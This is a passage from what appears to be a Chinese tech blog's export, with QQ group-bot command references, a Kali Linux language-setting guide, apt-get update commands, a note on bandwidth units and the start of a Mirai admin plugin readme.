<h3 id="定时器操作"><a href="#定时器操作" class="headerlink" title="定时器操作"></a>定时器操作</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">权限id：dscz</span><br></pre></td></tr></table></figure></div>

<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">中文格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>ds:</code></td>
<td align="left">查询定时任务</td>
<td align="left"><code>ds：</code></td>
<td align="left">&#96;查询定时器</td>
</tr>
<tr>
<td align="left"><code>%ds:(id)</code></td>
<td align="left">切换定时任务的状态，如果已经开启，则切换为关闭，id查询获取</td>
<td align="left"><code>%ds:1</code></td>
<td align="left">&#96;切换定时器:1</td>
</tr>
</tbody></table>
<hr>
<h2 id="群管理"><a href="#群管理" class="headerlink" title="群管理"></a>群管理</h2><p><code>权限id：group</code> <strong>此权限不是指令权限</strong></p>
<p>对于几个检测群的功能，需要先将对于群添加为检测群</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">/hy agroup (群号) <span class="comment">#添加</span></span><br><span class="line">/hy dgroup (群号) <span class="comment">#删除</span></span><br></pre></td></tr></table></figure></div>

<p>依然支持在config文件手动添加</p>
<hr>
<h3 id="特殊头衔"><a href="#特殊头衔" class="headerlink" title="特殊头衔"></a>特殊头衔</h3><p>当你的机器人是群主时才可以使用,拥有<code>admin</code>、<code>group</code>权限的用户也可以用于使用。</p>
<p>指令：</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">中文格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>%@(user) (内容)</code></td>
<td align="left">给这个人修改特殊头衔</td>
<td align="left"><code>%@放空 才不是放空了~</code></td>
<td align="left"><code>设置头衔@放空 才不是放空了~</code></td>
</tr>
</tbody></table>
<p>是群主才行哦~</p>
<hr>
<h3 id="群欢迎词"><a href="#群欢迎词" class="headerlink" title="群欢迎词"></a>群欢迎词</h3><p><code>权限id：grouphyc</code><br>当有人申请的时候，拥有管理员权限的机器人并且加入了检测的群<br>机器人会给出提示<br>在配置文件中有是否启用开关</p>
<p>指令：</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">中文格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&#96;开门 id</td>
<td align="left">all&#96;</td>
<td align="left">同意这个人的进群申请</td>
<td align="left"><code>开门 1</code></td>
</tr>
<tr>
<td align="left">&#96;同意 id</td>
<td align="left">all&#96;</td>
<td align="left">同意这个人的进群申请</td>
<td align="left"><code>同意 1</code></td>
</tr>
<tr>
<td align="left">&#96;关门 id</td>
<td align="left">all&#96;</td>
<td align="left">关门这个人的进群申请</td>
<td align="left"><code>关门 1</code></td>
</tr>
<tr>
<td align="left">&#96;拒绝 id</td>
<td align="left">all&#96;</td>
<td align="left">拒绝这个人的进群申请</td>
<td align="left"><code>拒绝 1</code></td>
</tr>
</tbody></table>
<p>id是进群时所提示的门牌号</p>
<p>欢迎词功能不需要检测群支持！<br>欢迎词指令：</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">中文格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>%hyc</code></td>
<td align="left">添加欢迎词</td>
<td align="left"><code>%hyc</code></td>
<td align="left"><code>添加欢迎词</code></td>
</tr>
<tr>
<td align="left"><code>hyc：</code></td>
<td align="left">查询欢迎词词</td>
<td align="left"><code>hyc:</code></td>
<td align="left"><code>查询欢迎词</code></td>
</tr>
<tr>
<td align="left"><code>-hyc:(id) [id]</code></td>
<td align="left">删除欢迎，id查询获得，第二个id是对应的欢迎词集合中的某条欢迎词，不支持多条删除</td>
<td align="left"><code>-hyc：2</code></td>
<td align="left"><code>删除欢迎词：1 15</code></td>
</tr>
</tbody></table>
<p>参数:</p>
<ul>
<li><code>lx | 轮询</code> 欢迎词将以轮询的方式逐条发送，<code>默认</code></li>
<li><code>sj | 随机</code> 欢迎词将随机发送</li>
<li><code>0 | 全局</code> 作用域：全局</li>
<li><code>gr(id) | 群组(id)</code> 作用域：群组</li>
</ul>
<p>欢迎词支持的动态消息:</p>
<table>
<thead>
<tr>
<th align="left">动态消息类型</th>
<th align="left">动态消息参数</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">匹配结果</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>at</code></td>
<td align="left"><code>this</code></td>
<td align="left">@(at)这个进群的人</td>
<td align="left"><code>$at(this)</code></td>
<td align="left">@放空</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>that</code></td>
<td align="left">这个要请他的人，如果没有邀请的人则会at同意他进来的那个人</td>
<td align="left"><code>$at(that)</code></td>
<td align="left">@放空</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>qq</code></td>
<td align="left">@群里的这个人，会固定@这个人</td>
<td align="left"><code>$at(572490972)</code></td>
<td align="left">@放空</td>
</tr>
<tr>
<td align="left"><code>message</code></td>
<td align="left"><code>apply</code></td>
<td align="left">获取这个人进群申请的消息</td>
<td align="left"><code>$message(apply)</code></td>
<td align="left">这个人什么都没说…</td>
</tr>
<tr>
<td align="left"><code>user</code></td>
<td align="left"><code>name</code></td>
<td align="left">获取这个人进群时的名称</td>
<td align="left"><code>$user(name)</code></td>
<td align="left">放空</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>id</code></td>
<td align="left">获取这个人的qq</td>
<td align="left"><code>$user(id)</code></td>
<td align="left">572490972</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>avatar</code></td>
<td align="left">获取这个人的头像</td>
<td align="left"><code>$user(avatar)</code></td>
<td align="left">[图片]</td>
</tr>
<tr>
<td align="left"><code>time</code></td>
<td align="left">所有支持动态消息的都支持时间，具体用法在文档前面的对话</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<hr>
<h3 id="禁言"><a href="#禁言" class="headerlink" title="禁言"></a>禁言</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">权限id：groupjy</span><br></pre></td></tr></table></figure></div>

<p>此指令只有在你的机器人是管理员或群主才能触发</p>
<p>指令：</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">中文格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>@某人(禁言时间)</code></td>
<td align="left">在机器人有权限的情况下，对你@的这个人进行指定时间的禁言</td>
<td align="left"><code>@放空 3m</code></td>
<td align="left">&#96;&#96;</td>
</tr>
<tr>
<td align="left"><code>@某人 0s</code></td>
<td align="left">解除禁言</td>
<td align="left"><code>@放空</code></td>
<td align="left">&#96;&#96;</td>
</tr>
</tbody></table>
<p>时间频率：</p>
<ul>
<li><code>s</code> 秒</li>
<li><code>m</code> 分钟</li>
<li><code>h</code> 小时</li>
<li><code>d</code> 天</li>
</ul>
<hr>
<h3 id="违禁词"><a href="#违禁词" class="headerlink" title="违禁词"></a>违禁词</h3><p>不需要检测群支持。<br>此指令只有在你的机器人是管理员或群主才能起作用。</p>
<p>指令：</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">中文格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>+wjc:(内容) [param]</code></td>
<td align="left">添加违禁词，内容是触发内容，param是参数，具体可以查看下方</td>
<td align="left"><code>+wjc:色图 ch 2m</code></td>
<td align="left"><code>添加违禁词：色图 % jy</code></td>
</tr>
<tr>
<td align="left"><code>-wjc:(id)</code></td>
<td align="left">删除违禁词，id查询获得</td>
<td align="left"><code>-wjc：2</code></td>
<td align="left"><code>删除违禁词：2</code></td>
</tr>
<tr>
<td align="left"><code>wjc：</code></td>
<td align="left">查询所有违禁词</td>
<td align="left"><code>wjc：</code></td>
<td align="left"><code>查询违禁词</code></td>
</tr>
</tbody></table>
<h4 id="参数的意义"><a href="#参数的意义" class="headerlink" title="参数的意义"></a>参数的意义</h4><ul>
<li><code>ch</code> 违禁词默认撤回，当输入ch后，wjc将不撤回消息</li>
<li><code>jy</code> 违禁词默认禁言，当输入jy后，wjc将不禁言</li>
<li><code>3s</code> 修改禁言时间,具体时间格式<a href="#%E7%A6%81%E8%A8%80">查看禁言</a></li>
<li><code>%</code> 重写回复语句,支持动态消息，具体支持动态消息查看下方</li>
<li><code>[gr1 | 0 ]</code> 群组或全局，默认当前群</li>
<li><code>1,2,3,4</code> 匹配方式，跟关键词回复的匹配同理</li>
<li><code>hmd3</code> 开启触发3次后就会踢出群聊，数字可自选</li>
</ul>
<p>hmd参数输入后，将会开启小黑屋功能，不会提示！当某个人触发这个wjc到达次数，直接踢出本群，可以和下面的自动添加黑名单配合！</p>
<p>违禁词回复消息支持动态消息：</p>
<table>
<thead>
<tr>
<th align="left">动态消息类型</th>
<th align="left">动态消息参数</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">匹配结果</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>at</code></td>
<td align="left"><code>this</code></td>
<td align="left">@(at)触发这条消息的人</td>
<td align="left"><code>$at(this)</code></td>
<td align="left">@放空</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>qq</code></td>
<td align="left">@群里的这个人，会固定@这个人</td>
<td align="left"><code>$at(572490972)</code></td>
<td align="left">@放空</td>
</tr>
<tr>
<td align="left"><code>message</code></td>
<td align="left"><code>this</code></td>
<td align="left">这个人触发这条消息的内容</td>
<td align="left"><code>$message(this)</code></td>
<td align="left">不会写插件怎么办？</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>jyString</code></td>
<td align="left">这条违禁词的禁言时间中文</td>
<td align="left"><code>$message(jyString)</code></td>
<td align="left">禁言2分钟</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>prohibitString</code></td>
<td align="left">同上</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>null</code></td>
<td align="left">不发送消息</td>
<td align="left"><code>$message(null)</code></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>user</code></td>
<td align="left"><code>name</code></td>
<td align="left">获取这个人的名称</td>
<td align="left"><code>$user(name)</code></td>
<td align="left">放空</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>id</code></td>
<td align="left">获取这个人的qq</td>
<td align="left"><code>$user(id)</code></td>
<td align="left">572490972</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>avatar</code></td>
<td align="left">获取这个人的头像</td>
<td align="left"><code>$user(avatar)</code></td>
<td align="left">[图片]</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>title</code></td>
<td align="left">获取这个人的头衔，优先获取特殊头衔</td>
<td align="left"><code>$user(title)</code></td>
<td align="left">才不是放空了~</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>info</code></td>
<td align="left">详细信息??</td>
<td align="left"><code>$user(info)</code></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>time</code></td>
<td align="left"><code>now</code></td>
<td align="left">获取当前时间，默认格式<code>yyyy-MM-dd HH:mm:ss</code></td>
<td align="left"><code>$time(now)</code></td>
<td align="left">2022-8-28 02:15:15</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>(时间格式)</code></td>
<td align="left">按照指定的时间格式进行现在的时间输出</td>
<td align="left"><code>$time(HH:mm:ss)</code></td>
<td align="left">02:16:20</td>
</tr>
</tbody></table>
<hr>
<h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">权限id：grouphmd</span><br></pre></td></tr></table></figure></div>

<p>不需要检测群支持。<br>此指令只有在你的机器人是管理员或群主才能触发。<br>支持作用域！！设置为全局时，该用户将被你的bot封禁！</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">中文格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>+hmd:@(user) [param]</code></td>
<td align="left">添加黑名单，参数看下方</td>
<td align="left"><code>+hmd:@放空 jy</code></td>
<td align="left"><code>添加黑名单:@放空 %</code></td>
</tr>
<tr>
<td align="left"><code>hmd:</code></td>
<td align="left">查询黑名单</td>
<td align="left"><code>hmd:</code></td>
<td align="left"><code>查询黑名单</code></td>
</tr>
<tr>
<td align="left"><code>-hmd:(id)</code></td>
<td align="left">删除黑名单,id查询获得</td>
<td align="left"><code>-hmd:3</code></td>
<td align="left"><code>删除黑名单:2</code></td>
</tr>
</tbody></table>
<p>参数：</p>
<ul>
<li><code>t</code> 默认检测到就踢出，携带参数不踢出</li>
<li><code>jy</code> 默认禁言(优先踢出),携带参数不禁言</li>
<li><code>ch</code> 默认撤回该用户的消息，携带不提出</li>
<li><code>0 | gr(id)</code> 作用域不携带参数<code>默认当前群</code></li>
<li><code>%</code> 重写封禁理由</li>
</ul>
<p>此功能需要检测群支持！<br>在配置文件blacklist有退群自动添加黑名单开关！<br>里面还有重写封禁理由！</p>
<hr>
<h3 id="撤回消息"><a href="#撤回消息" class="headerlink" title="撤回消息"></a>撤回消息</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">权限id：groupch</span><br></pre></td></tr></table></figure></div>

<p>用于撤回上面的群消息，机器人是管理员和群主才能使用</p>
<p>指令：</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">中文格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>!recall</code></td>
<td align="left">撤回上面这条消息</td>
<td align="left"><code>!recall</code></td>
<td align="left"><code>撤回</code></td>
</tr>
<tr>
<td align="left"><code>！recall (number)</code></td>
<td align="left">撤回前面几条消息，不包含这条消息</td>
<td align="left"><code>！recall 5</code></td>
<td align="left"><code>撤回 5</code></td>
</tr>
<tr>
<td align="left"><code>!recall 1-5</code></td>
<td align="left">撤回上面1到5条，从第0条算起，包含这条消息</td>
<td align="left"><code>!recall 1-5</code></td>
<td align="left"><code>撤回 25-55</code></td>
</tr>
</tbody></table>
<p>具体用法试一试就明白，撤回多条消息时，权限可能会有冲突。</p>
<hr>
<h3 id="踢人"><a href="#踢人" class="headerlink" title="踢人"></a>踢人</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">权限id：grouptr</span><br></pre></td></tr></table></figure></div>

<p>此指令只有在你的机器人是管理员或群主才能触发</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">中文格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>tr@(user) [hmd]</code></td>
<td align="left">踢人</td>
<td align="left"><code>tr@放空</code></td>
<td align="left"><code>踢人@放空</code></td>
</tr>
</tbody></table>
<p>参数：</p>
<ul>
<li><code>hmd</code> qq的踢人有个禁止此用户再次加群，输入后将禁止此用户再次加群</li>
</ul>
<hr>
<h2 id="权限系统"><a href="#权限系统" class="headerlink" title="权限系统"></a>权限系统</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">权限id：admin</span><br></pre></td></tr></table></figure></div>

<p>指令：</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">中文格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>+@(user) (权限id)</code></td>
<td align="left">赋予这个群的这个人的某个权限,权限id可在文档查看</td>
<td align="left"><code>+@放空 admin</code></td>
<td align="left"><code>添加@放空 all</code></td>
</tr>
<tr>
<td align="left"><code>-@(user)</code></td>
<td align="left">移除这个权限</td>
<td align="left"><code>-@放空 all</code></td>
<td align="left"><code>删除@放空 group</code></td>
</tr>
<tr>
<td align="left"><code>！power [param]</code></td>
<td align="left">查询权限列表，参数如下</td>
<td align="left"><code>!power all</code></td>
<td align="left"><code>权限列表 all</code></td>
</tr>
</tbody></table>
<p>参数：</p>
<ul>
<li>&#96;&#96;不填默认当前群</li>
<li><code>@某人</code> 查看指定人在本群的权限</li>
<li><code>all</code> 查询所有权限或添加所有权限或删除所有权限</li>
</ul>
<p>查询可以输入对应的群号 或者 qq号 来查询指定区域的权限信息<br>也可以直接 all 查询全部<br>然后通过 <code>上一页</code> 和 <code>下一页</code> 来进行翻译阅读</p>
<hr>
<h2 id="多机器人互冲"><a href="#多机器人互冲" class="headerlink" title="多机器人互冲"></a>多机器人互冲</h2><p>对于同时加载多个bot的使用者<br>容易存在一条指令两个bot触发，因此，加了一个‘暂停功能’</p>
<p>指令：</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">中文格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>！pause @(bot)</code></td>
<td align="left">你发的下一条消息，这个机器人将会忽略(包括触发)</td>
<td align="left"><code>！pause@乌拉</code></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>!pause @(bot) 5</code></td>
<td align="left">忽略下5条消息，消息数量自定</td>
<td align="left"><code>！pause @乌拉 5</code></td>
<td align="left"></td>
</tr>
</tbody></table>
<p>不带参数，默认忽略你的下一条消息<br>也可以自定义忽略下几条消息，这个记录是写在内存的，如果不小心输入多了（9999999999），重启就行。</p>
<hr>
<h2 id="插件指令"><a href="#插件指令" class="headerlink" title="插件指令"></a>插件指令</h2><table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>/hy aGroup</code></td>
<td align="left">添加一个监测群</td>
<td align="left"><code>/hy aGroup 390444068</code></td>
</tr>
<tr>
<td align="left"><code>/hy dGroup</code></td>
<td align="left">删除一个监测群</td>
<td align="left"><code>/hy dGroup 390444068</code></td>
</tr>
<tr>
<td align="left"><code>/hy v</code></td>
<td align="left">查询当前插件版本</td>
<td align="left"><code>/hy v</code></td>
</tr>
<tr>
<td align="left"><code>/hy transfer</code></td>
<td align="left">转移一个所属bot的数据到另一个bot</td>
<td align="left"><code>/hy transfer 2061954151 3630254205</code></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
      <tags>
        <tag>QQbot</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux如何修改语言为中文</title>
    <url>/posts/4c6d962f.html</url>
    <content><![CDATA[<h3 id="友情提示"><a href="#友情提示" class="headerlink" title="友情提示"></a>友情提示</h3><p>修改前快照一下，避免修改操作错误带来的问题！</p>
<ol>
<li><p>打开终端</p>
</li>
<li><p>打开设置</p>
<p>输入</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>修改设置</p>
<p><code>en_US.UTF-8 UTF-8</code>改为不勾选</p>
<ul>
<li>下面这种有个<code>*</code>属于已经勾选了</li>
<li>通过上下箭头按键我们把红点（表示当前选中的选项）移动到<code>en_US.UTF-8 UTF-8</code>，按下空格表示不勾选&#x2F;勾选</li>
<li>使用空格勾选<code>[ ]zh_CN.GBK_GBK</code> 和<code>[ ] zh-CN.UTF-8.UTF-8</code>两个选项，这里有部分虚拟机会找不到<code>[ ]zh_CN.GBK_GBK</code>，这两个选项是紧跟着的，找不到就算了，问题不大。</li>
<li>按下<code>enter</code> 表示<code>ok</code>，选择语言<code>zh_CN.UTF-8</code></li>
</ul>
</li>
<li><p>重启生效设置</p>
<p>重启后会有个提示，建议你选择<code>保留旧名称</code>，以后路径敲代码敲英文肯定比敲中文方便很多！</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure></div></li>
</ol>
<hr>
<p>原文：<a class="link"   href="https://blog.csdn.net/u011027547/article/details/123344249" >https://blog.csdn.net/u011027547/article/details/123344249<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux更新软件包一条龙命令</title>
    <url>/posts/82a71d79.html</url>
    <content><![CDATA[<p>apt-get update 更新索引</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure></div>

<p>apt-get upgrade 更新软件</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure></div>

<p>apt-get dist-upgrade 升级</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get dist-upgrade</span><br></pre></td></tr></table></figure></div>

<p>apt-get clean 删除缓存包</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get clean</span><br></pre></td></tr></table></figure></div>

<p>apt-get autoclean 删除未安装的 deb 包</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get autoclean</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Mbps，Mb/s, MB/s的区别</title>
    <url>/posts/66b2f6fd.html</url>
    <content><![CDATA[<p>为了搞懂这几个单位之间的区别，我们首先需要弄懂这其中的最重要的 <strong>B</strong> 与 <strong>b</strong> 分别代表了什么</p>
<p><strong>b</strong>，通常为 bit 的简称，中文为比特，计算机存储传输中的最小单位</p>
<p><strong>B</strong>，通常为 Byte 的简称，中文为字节，其中 1Byte&#x3D;8bit</p>
<p>其中，bit 这个单位太小了，通常只在数据通信形容带宽时出现</p>
<h2 id="单位转换"><a href="#单位转换" class="headerlink" title="单位转换"></a>单位转换</h2><p><strong>1 Byte &#x3D; 8 bit</strong></p>
<p><strong>1 KB &#x3D; 1024 B (KB, KiloByte)</strong></p>
<p><strong>1MB &#x3D; 1024 KB (MB, MegaByte)</strong></p>
<p><strong>1 GB &#x3D; 1024 MB (GB, GigaByte)</strong></p>
<p><strong>1 TB &#x3D; 1024 GB (TB, TeraByte)</strong></p>
<p>这些单位通常用来指代某个文件大小，或者说存储设备的存储容量</p>
<p>以上通常用来指代存储大小，而如果形容传输速度或者下载速度的话</p>
<p>那么，很明显我们还需要结合时间单位 s，秒</p>
<p>加上了秒，我们就可以得到更加丰富的单位</p>
<p><strong>Mbps</strong>, Megabits per second，兆比特每秒</p>
<p><strong>Mb&#x2F;s</strong>, Megabits per second，兆比特每秒</p>
<p><strong>MB&#x2F;s</strong>, MegaByte per second, 兆字节每秒</p>
<p>值得注意的是，在描述计算机网络传输速率时，它们之间的转换倍数不再是 1024 而是 1000</p>
<p><strong>1 Kb&#x2F;s &#x3D; 1000 b&#x2F;s</strong></p>
<p><strong>1 Mb&#x2F;s &#x3D; 1000 Kb&#x2F;s</strong></p>
<p><strong>1 Gb&#x2F;s &#x3D; 1000 Mb&#x2F;s</strong></p>
<p>搞明白了这个基本含义，那么我们可以很轻松得到这几个常见单位之间的转换关系了</p>
<p><strong>1 MB&#x2F;s &#x3D; 8 Mb&#x2F;s &#x3D; 8 Mbps</strong></p>
<hr>
<p>相关链接：<a class="link"   href="https://zhuanlan.zhihu.com/p/682846252#/" >https://zhuanlan.zhihu.com/p/682846252#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>计算机网络</tag>
        <tag>传输速率</tag>
      </tags>
  </entry>
  <entry>
    <title>Mirai Administrator 机器人管理插件，好友/群管理，黑名单，宵禁</title>
    <url>/posts/369f16e7.html</url>
    <content><![CDATA[<h1 id="Mirai-Administrator"><a href="#Mirai-Administrator" class="headerlink" title="Mirai Administrator"></a>Mirai Administrator</h1><blockquote>
<p>基于 Mirai Console 的 管理员 Bot 及其标准</p>
</blockquote>
<p><a href="https://github.com/cssxsh/mirai-administrator/releases"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img.shields.io/github/v/release/cssxsh/mirai-administrator"
                      alt="Release"
                ></a><br><a href="https://repo1.maven.org/maven2/xyz/cssxsh/mirai/mirai-administrator/"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img.shields.io/github/downloads/cssxsh/mirai-administrator/total"
                      alt="Downloads"
                ></a><br><a href="https://search.maven.org/artifact/xyz.cssxsh.mirai/mirai-administrator"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img.shields.io/maven-central/v/xyz.cssxsh.mirai/mirai-administrator"
                      alt="maven-central"
                ></a><br><a href="https://www.codacy.com/gh/cssxsh/mirai-administrator/dashboard?utm_source=github.com&utm_medium=referral&utm_content=cssxsh/mirai-administrator&utm_campaign=Badge_Grade"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://app.codacy.com/project/badge/Grade/8be173fe96c74059bfedd6268b8e6f0c"
                      alt="Codacy Badge"
                ></a></p>
<p><strong>使用前应该查阅的相关文档或项目</strong></p>
<ul>
<li><a class="link"   href="https://github.com/mamoe/mirai/blob/dev/docs/UserManual.md" >User Manual<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://github.com/mamoe/mirai/blob/dev/mirai-console/docs/BuiltInCommands.md#permissioncommand" >Permission Command<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://github.com/project-mirai/chat-command" >Chat Command<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<p>本插件实现的功能有:</p>
<ul>
<li>联系人相关 自动审批，指令查看，用户留言</li>
<li>消息相关 发送消息，撤回消息</li>
<li>群管理相关 群消息审核，自动宵禁，自动清理不发言，禁言自动退群</li>
</ul>
<p>本插件提供<a class="link"   href="https://mirai.mamoe.net/topic/972/mirai-administrator-%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%AE%A1%E7%90%86%E6%8F%92%E4%BB%B6-%E5%A5%BD%E5%8F%8B-%E7%BE%A4%E7%AE%A1%E7%90%86-%E9%BB%91%E5%90%8D%E5%8D%95-%E5%AE%B5%E7%A6%81/2?page=1#%E6%9C%8D%E5%8A%A1%E6%8E%A5%E5%8F%A3" >服务接口<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>以供其他插件拓展功能<br>例如使用 <a class="link"   href="https://github.com/gnuf0rce/mirai-content-censor" >Mirai Content Censor<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 依靠百度API审查群消息<br>例如使用 <a class="link"   href="https://github.com/cssxsh/mirai-authenticator" >Mirai Authenticator<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 验证加群请求</p>
<h2 id="MCL-指令安装"><a href="#MCL-指令安装" class="headerlink" title="MCL 指令安装"></a>MCL 指令安装</h2><p><strong>请确认 mcl.jar 的版本是 2.1.0+</strong><br><code>./mcl --update-package xyz.cssxsh.mirai:mirai-administrator --channel maven-stable --type plugin</code></p>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>注意: 使用前请确保可以 <a class="link"   href="https://github.com/project-mirai/chat-command" >在聊天环境执行指令<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><code>&lt;...&gt;</code>中的是指令名<br><code>[...]</code>表示参数，当<code>[...]</code>后面带<code>?</code>时表示参数可选</p>
<p>本插件指令权限ID 格式为 <code>xyz.cssxsh.mirai.plugin.mirai-administrator:command.*</code>, <code>*</code> 是指令的第一指令名<br>例如 <code>/send to 12345</code> 的权限ID为 <code>xyz.cssxsh.mirai.plugin.mirai-administrator:command.send</code><br>对 机器人发送的<strong>联系人请求</strong>通知消息 回复 <code>同意</code> 或 <code>不同意</code> 或 <code>拉黑</code> 即可处理<br>插件提供黑名单功能，使用指令 <code>/contact black u12345</code>, 即可拉黑用户，Bot将不响应用户动作（包括其他插件的功能）</p>
<h3 id="ADMINCONTACTCOMMAND"><a href="#ADMINCONTACTCOMMAND" class="headerlink" title="ADMINCONTACTCOMMAND"></a>ADMINCONTACTCOMMAND</h3><table>
<thead>
<tr>
<th align="left">Command</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>/&lt;contact&gt; &lt;delete&gt; [contact]</code></td>
<td align="left">删除联系人</td>
</tr>
<tr>
<td align="left"><code>/&lt;contact&gt; &lt;handle&gt; [id] [accept]? [black]?</code></td>
<td align="left">处理联系人申请</td>
</tr>
<tr>
<td align="left"><code>/&lt;contact&gt; &lt;request&gt;</code></td>
<td align="left">查看申请列表</td>
</tr>
<tr>
